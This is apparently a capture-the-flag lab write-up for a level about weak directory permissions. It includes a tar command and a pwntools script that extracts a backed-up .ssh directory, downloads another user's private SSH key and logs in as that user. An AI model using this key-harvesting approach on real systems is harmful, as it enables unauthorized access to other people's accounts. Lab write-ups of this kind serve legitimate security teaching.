# Level 05

## Discription

>Check the flag05 home directory. You are looking for weak directory permissions \
\
>To do this level, log in as the level05 account with the password level05. Files for this level can be found in /home/flag05.

## Solution

Looking into /home/flag05/ directory we have one suspicious hidden backup directory. Inside which there is a archive file. We have execute permission in .backup directory so we can unarchive  the file using tar.

```bash
tar -xvf backup-19072011.tgz -C /tmp
```

Remember we does not have write permission in .backup directory that's why we have unarchived the file in /tmp directory.

tar output reveals that `backup-19072011.tgz` was backup file for .ssh directory, which is now in our /tmp/.ssh. Now we can easily login to flag05 using ssh with flag05 user private key(id_rsa) 

![](Images/solution.png)

## Python

```python
#!/usr/bin/python3

from pwn import *
from sys import argv,exit

if len(argv) < 2:
	sys.exit("Target IP Missing") 

level05 = ssh(host=argv[1],user='level05',password='level05')
level05_shell = level05.shell('sh')
level05.sendline('tar -xvf /home/flag05/.backup/backup-19072011.tgz -C /tmp/')
file = level05.download_file(remote='/tmp/.ssh/id_rsa',local='/tmp/id_rsa')
level05_shell.kill()
level05.close()

log.progress(f"Got flag05 user's ssh private key : /tmp/id_rsa")

flag05 = ssh(host=argv[1],user='flag05',keyfile='/tmp/id_rsa')
flag05_shell = flag05.shell('sh')
flag05_shell.sendline('getflag')
flag05_shell.interactive(prompt='')
```

